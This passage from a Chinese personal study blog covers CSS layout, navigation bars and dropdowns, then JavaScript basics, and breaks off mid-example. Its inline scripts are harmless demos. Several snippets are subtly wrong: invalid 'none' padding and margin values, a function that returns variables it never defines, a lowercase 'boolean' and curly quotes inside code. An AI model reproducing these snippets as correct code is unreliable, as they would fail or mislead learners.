bottom;竖直方向对齐<br>&#125;<br></code></pre></td></tr></table></figure><p>表格填充<br>控制边框和表格内容之间的间距，使用td与th元素的填充属性:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">td</span>&#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span>;<br>&#125;<br>会使表格更大更易于观察<br></code></pre></td></tr></table></figure><h3 id="CSS盒子模型"><a href="#CSS盒子模型" class="headerlink" title="CSS盒子模型"></a>CSS盒子模型</h3><p><img src="/2022/06/30/front/p3.jpg"><br><strong>Margin:外边距<br>Border:边框<br>Padding:内边距<br>Content:内容</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">25px</span> solid green;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">25px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">25px</span>;<br>    //一共是<span class="hljs-number">450px</span>的宽度<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS边框Border"><a href="#CSS边框Border" class="headerlink" title="CSS边框Border"></a>CSS边框Border</h3><p>border-style属性：<br>none：无边框<br>solid：实线边框<br>等等<br>**border-width:边框宽度<br>border-color:边框颜色<br>border-top-style:顶框样式<br>等等<br>**<br>p.one{<br>    border-style: solid;<br>    border-width: 5px;<br>    border-color: red;<br>}</p><h3 id="CSS轮廓outline"><a href="#CSS轮廓outline" class="headerlink" title="CSS轮廓outline"></a>CSS轮廓outline</h3><p>轮廓是绘制于元素周围的一条线，位于边框边缘的外围</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">outline-color</span><br><span class="hljs-attribute">outline-style</span><br><span class="hljs-attribute">outline-width</span><br></code></pre></td></tr></table></figure><h3 id="CSS外边距margin"><a href="#CSS外边距margin" class="headerlink" title="CSS外边距margin"></a>CSS外边距margin</h3><p>margin用于清除周围的元素区域。margin没有背景颜色，完全透明。</p><h3 id="CSS填充padding"><a href="#CSS填充padding" class="headerlink" title="CSS填充padding"></a>CSS填充padding</h3><p>padding设置元素内，文本内容与边框之间的距离</p><h3 id="CSS内隐藏元素"><a href="#CSS内隐藏元素" class="headerlink" title="CSS内隐藏元素"></a>CSS内隐藏元素</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span><span class="hljs-selector-class">.hidden</span>&#123;<br>    <span class="hljs-attribute">visibility</span>: hidden;<br>&#125;<br><span class="hljs-selector-tag">h1</span><span class="hljs-selector-class">.hidden1</span>&#123;<br>    <span class="hljs-attribute">display</span>: none;<br>&#125;<br>注意，前者只是看不见，但占空间<br>后者是不占空间<br></code></pre></td></tr></table></figure><h3 id="CSS定位position"><a href="#CSS定位position" class="headerlink" title="CSS定位position"></a>CSS定位position</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.p_fixed</span>&#123;<br>    <span class="hljs-attribute">position</span>: fixed;<br>&#125;<br>会使元素位置相对于浏览器窗口是固定位置<br></code></pre></td></tr></table></figure><h3 id="CSS溢出文本的处理Overflow"><a href="#CSS溢出文本的处理Overflow" class="headerlink" title="CSS溢出文本的处理Overflow"></a>CSS溢出文本的处理Overflow</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">overflow: visible元素不被修剪，呈现于元素框外面<br>overflow: hidden元素被剪掉<br>overflow：scroll（<span class="hljs-keyword">auto</span>）元素被剪掉，但可以用滚动条查看剩余内容。<br></code></pre></td></tr></table></figure><h3 id="CSS元素的浮动"><a href="#CSS元素的浮动" class="headerlink" title="CSS元素的浮动"></a>CSS元素的浮动</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">img</span>&#123;<br>    <span class="hljs-attribute">float</span>: right;<br>&#125;<br>则该图片会显示在网页的右侧，而其余元素会包围它出现<br><br></code></pre></td></tr></table></figure><p>如：<br>这是参数为left时<br><img src="/2022/06/30/front/p4.png"><br>而以下为参数是right时<br><img src="/2022/06/30/front/p5.png"></p><h3 id="CSS对齐"><a href="#CSS对齐" class="headerlink" title="CSS对齐"></a>CSS对齐</h3><p>元素居中对齐：<br>先设置元素宽度<code>width</code>属性，再</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span>&#123;<br>    <span class="hljs-attribute">margin</span>: auto;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid red;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>&#125;<br><span class="hljs-attribute">margin</span>: auto;即可使元素水平居中<br><span class="hljs-attribute">text-align</span>: center;<br>是文本居中<br><br></code></pre></td></tr></table></figure><p>而垂直居中，则设置行间距与高度height相等</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span> &#123;<br>    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid green;<br>    <span class="hljs-attribute">text-align</span>: center;<br>&#125;<br> <br><span class="hljs-comment">/* 如果文本有多行，添加以下代码: */</span><br><span class="hljs-selector-class">.center</span> <span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.5</span>;<br>    <span class="hljs-attribute">display</span>: inline-block;<br>    <span class="hljs-attribute">vertical-align</span>: middle;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS伪元素"><a href="#CSS伪元素" class="headerlink" title="CSS伪元素"></a>CSS伪元素</h3><p>:first-line伪元素</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">:first</span>-line<br>&#123;<br>    <span class="hljs-attribute">color</span>: red;<br>    <span class="hljs-attribute">font-variant</span>: small-caps;<br>&#125;<br>first-line伪元素只用于块级元素<br></code></pre></td></tr></table></figure><p>before/after伪元素</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">用于在元素后面或前面添加东西，如在每个&lt;<span class="hljs-selector-tag">h2</span>&gt;前面添加图片<br><span class="hljs-selector-tag">h2</span><span class="hljs-selector-pseudo">:before</span>&#123;<br>    <span class="hljs-attribute">content</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;a.jpg&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS导航栏的制作"><a href="#CSS导航栏的制作" class="headerlink" title="CSS导航栏的制作"></a>CSS导航栏的制作</h3><p>第一步：使用无序列表，元素为a标签</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title3<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title4<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><p>再删除列表前的点，删除边距与填充</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ul</span>&#123;<br>           <span class="hljs-built_in">list-style-type:</span> <span class="hljs-string">none</span>;<br>           <span class="hljs-string">padding</span>: <span class="hljs-string">none</span>;<br>           <span class="hljs-string">margin</span>: <span class="hljs-string">none</span>;<br>       &#125;<br></code></pre></td></tr></table></figure><p>给链接元素转换为块元素<br>并设置宽度（默认为最大，需要设置）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>&#123;<br>    <span class="hljs-attribute">display</span>: block;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">60px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进一步设置，鼠标移动到导航栏上后，修改颜色。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>&#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#555</span>;<br>    <span class="hljs-attribute">color</span>: white;<br>&#125;<br></code></pre></td></tr></table></figure><p>添加active类，被选中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.active</span>&#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#4CAF50</span>;<br>    <span class="hljs-attribute">color</span>: white;<br>&#125;<br>注意，不是:而是.<br>因为这里，是标记出当前页面所在的选项，而不是正在选择<br></code></pre></td></tr></table></figure><p>加上边框</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span> &#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#555</span>;<br>&#125;<br> <br><span class="hljs-selector-tag">li</span> &#123;<br>    <span class="hljs-attribute">text-align</span>: center;<br>    <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#555</span>;<br>&#125;<br> <br><span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:last-child</span> &#123;<br>    <span class="hljs-attribute">border-bottom</span>: none;<br>&#125;<br></code></pre></td></tr></table></figure><p>成为全屏高度的固定导航条</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span>&#123;<br>    <span class="hljs-attribute">position</span>: fixed;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">25%</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;<br>    <span class="hljs-attribute">overflow</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS导航栏2–水平导航栏"><a href="#CSS导航栏2–水平导航栏" class="headerlink" title="CSS导航栏2–水平导航栏"></a>CSS导航栏2–水平导航栏</h3><p>使用内联（inline）或浮动（float）的列表项。<br><strong>内联列表项</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span><br>&#123;<br>    <span class="hljs-attribute">display</span>: inline;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS下拉菜单"><a href="#CSS下拉菜单" class="headerlink" title="CSS下拉菜单"></a>CSS下拉菜单</h3><p>当鼠标移动到指定元素上时，会出现下拉菜单</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.dropdown</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">position</span>: relative;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: inline-block;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.dropdown-content</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: none;</span><br><span class="language-css">  <span class="hljs-attribute">position</span>: absolute;</span><br><span class="language-css">  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f9f9f9</span>;</span><br><span class="language-css">  <span class="hljs-attribute">min-width</span>: <span class="hljs-number">160px</span>;</span><br><span class="language-css">  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0px</span> <span class="hljs-number">8px</span> <span class="hljs-number">16px</span> <span class="hljs-number">0px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.2</span>);</span><br><span class="language-css">  <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span> <span class="hljs-number">16px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.dropdown</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-class">.dropdown-content</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>[mycode3]<br>[mycode3 type=&quot;html&quot;]<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>鼠标移动到我这！<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-content&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>菜鸟教程<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>www.runoob.com<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><h3 id="JS的用法"><a href="#JS的用法" class="headerlink" title="JS的用法"></a>JS的用法</h3><p>js代码必须位于HTML中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs <script>```与```</script>```之间">通常，我们需要在某个事件发生时执行代码，比如当用户点击按钮时。<br>如果我们把 JavaScript 代码放入函数中，就可以在事件发生时调用该函数。<br>### JS的输出<br>JS没有任何打印或者输出的函数<br>**JS显示数据**<br>window.alert()<br><br>弹出警告窗口<br></code></pre></td></tr></table></figure><script>window.alert(5+6);</script><p>会弹出11的窗口</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>操作HTML元素<br>document<span class="hljs-selector-class">.getElementById</span>(<span class="hljs-string">&quot;demo&quot;</span>)<span class="hljs-selector-class">.innerHTML</span> = <span class="hljs-string">&quot;段落已修改&quot;</span><br>这个是按id查找元素，并进行操作的方法<br></code></pre></td></tr></table></figure><p id="demo">段落1</p><script>document.getElementById("demo").innerHTML = "段落已修改"</script>会显示“段落已修改”<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">直接写入<span class="hljs-selector-tag">HTML</span>文档<br></code></pre></td></tr></table></figure>document.write(Date());<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">会额外输出<span class="hljs-built_in">write</span>内的内容<br>**写到控制台**<br></code></pre></td></tr></table></figure>console.log(message)会输出内容到控制台<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS字面量<br>**数字字面量**<br></code></pre></td></tr></table></figure>3.141001123e5<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**字符串字面量**</span><br>单双引号皆可<br></code></pre></td></tr></table></figure>"jobe d"'lddd sd'<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**表达式字面量**</span><br></code></pre></td></tr></table></figure>7+102 * 8<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**数组字面量**</span><br></code></pre></td></tr></table></figure>[40, 100, 200]<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**对象字面量**</span><br></code></pre></td></tr></table></figure>{firstname:"John", lastname:"Done"}<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**函数字面量**</span><br></code></pre></td></tr></table></figure>function myFunc(am,bm){    return a+b;}<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">**JS变量**</span><br>用<span class="hljs-keyword">var</span>定义<br></code></pre></td></tr></table></figure>var x, length；<p>x = 5；<br>length = 6；</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">**JS注释**<br>双斜杠```//```<br>**且JS大小写敏感**<br>### JS语句<br></code></pre></td></tr></table></figure><p>可以用分号结尾一句代码<br>可以多写空格，提高可读性</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS数据类型和对象<br>new关键字指定类型<br></code></pre></td></tr></table></figure><p>var x=  new Number<br>var ca= new String<br>var fl= new boolean</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**对象**</span><br>对象有<span class="hljs-strong">**属性**</span>和<span class="hljs-strong">**方法**</span><br></code></pre></td></tr></table></figure><p>定义一个对象</p><p>var car = { name: “Fiat”, model:500, color: “white” };<br>每个值用name: value表示，值之间用逗号分割</p><p>访问对象属性</p><p>car.name<br>car[“color”]<br>两种方式均可</p><p>对象方法<br>创建对象：<br>var person{<br>    name:”DAvid”,<br>    lasy:”DAAA”,<br>    methodName:function(){<br>    return name + “ “ + lasy<br>    }<br>}<br>即在类内定义好了方法<br>调用：<br>person.methodName()<br>即可</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS函数<br>定义函数<br></code></pre></td></tr></table></figure><p>function funcname(var1,var2){<br>    //执行代码<br>}</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean">不用声明参数的数据类型<br>### JS事件<br>#### HTML事件<br>如：HTML页面完成加载<br>HTML input字段发生改变<br>HTML按钮被点击<br>当发生事件时，可以用JS做些事情，语法如下<br></code></pre></td></tr></table></figure><some-HTML-element some-event="JavaScript 代码">如：<button onclick="this.innerHTML=Date()">现在的时间是</button>代码将修改自身元素的内容  this.innerHTML可以达到效果<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">常见的<span class="hljs-selector-tag">HTML</span>事件<br></code></pre></td></tr></table></figure><p>onchange HTML元素改变<br>onclick 点击HTML元素<br>onmouseover 鼠标移动到元素上</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS字符串<br>可以用索引位置，从<span class="hljs-number">0</span>开始访问字符<br></code></pre></td></tr></table></figure><p>var charn = str[9]</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">字符串中的引号，不要跟字符串的引号相同，一双一单<br><span class="hljs-strong">**字符串长度**</span><br></code></pre></td></tr></table></figure><p>var txt = “ABNCNJMMMM”<br>var num = txt.length;<br>length是内置属性</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**字符串可以是对象**</span><br></code></pre></td></tr></table></figure><p>var fristname=new String(“bob”)<br>typeof fristname // return String</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">String可以用```+```链接起来<br>数字与字符串相加，将数字自动转换为字符串后，返回字符串<br></code></pre></td></tr></table></figure><p>z = “hello” + 5<br>hello5</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS条件语句<br>与C++一样<br>switch也一样<br><br>### JS for循环<br></code></pre></td></tr></table></figure><p>for (var i=0;i&lt;cars.length;i++)<br>{<br>    document.write(cars[i] + “<br>“);<br>}</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">也与C</span>++<span class="hljs-comment">一样，只是第一个参数是var定义的变量</span><br><span class="hljs-comment">for</span>--<span class="hljs-comment">in循环</span><br></code></pre></td></tr></table></figure><p>var person = {fname:”boll”, lname:”vil”, age:56};<br>for(x in person)<br>{<br>    txt = txt + person[x];<br>}</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS类型转换<br></code></pre></td></tr></table></figure><p>var a<br>a=String(123)<br>var b<br>b = Number(“3.14”)</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS正则表达式（RE）<br>如<br></code></pre></td></tr></table></figure><p>var patt = /runoob/i</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">```<br>/runoob/是正则表达式主题，用于检索<br>i是修饰符，表示不分大小写<br></code></pre></td></tr></table></figure><p>正则表达式常用于检索和替换中</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var str <span class="hljs-operator">=</span> document.getElementById(<span class="hljs-string">&quot;DEmo&quot;</span>).innerHTML<span class="hljs-comment">;</span><br>var n <span class="hljs-operator">=</span> str.search(<span class="hljs-string">&quot;Runoob&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>replace:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> str = document.getElementById(<span class="hljs-string">&quot;demo&quot;</span>).innerHTML;<br><span class="hljs-keyword">var</span> txt = str.<span class="hljs-built_in">replace</span>(<span class="hljs-regexp">/microsoft/i</span>,<span class="hljs-string">&quot;Runoob&quot;</span>);<br>修改了txt内容，str未变<br><br></code></pre></td></tr></table></figure><h3 id="JS表单验证"><a href="#JS表单验证" class="headerlink" title="JS表单验证"></a>JS表单验证</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">validateForm</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> x=<span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span 